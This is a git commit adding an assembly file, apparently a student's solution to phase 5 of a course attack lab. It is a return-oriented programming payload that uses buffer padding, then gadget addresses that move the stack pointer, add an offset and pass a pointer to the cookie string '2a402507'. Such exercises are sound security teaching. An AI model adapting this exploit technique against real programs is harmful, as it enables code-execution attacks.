c820580dfe768a37affd27ecacc84630c38b0b8d
gyf1214 <gyf1214@gmail.com>
2016-10-12 18:51:28 +0800

    updated

---
+++ LAB-3/src/5.s
@@ -0,0 +1,22 @@
+.globl rsp
+
+rsp:
+    .org rsp + 0x18, 0x23
+
+rbp:
+    .quad 0x401ad0      /* movq %rsp, %rax */
+rdi:
+    .quad 0x401a46      /* movq %rax, %rdi */
+    .quad 0x401a40      /* popq %rax */
+    .quad data - rdi    /* offset */
+    .quad 0x401b0b      /* movl %eax, %edx */
+    .quad 0x401a8e      /* movl %edx, %ecx */
+    .quad 0x401ac2      /* movl %ecx, %esi */
+    .quad 0x401a79      /* jmpq <add_xy>  */
+    .quad 0x401a46      /* movq %rax, %rdi */
+
+data:
+    .asciz "2a402507"
+
+tail:
+    .byte 0xa
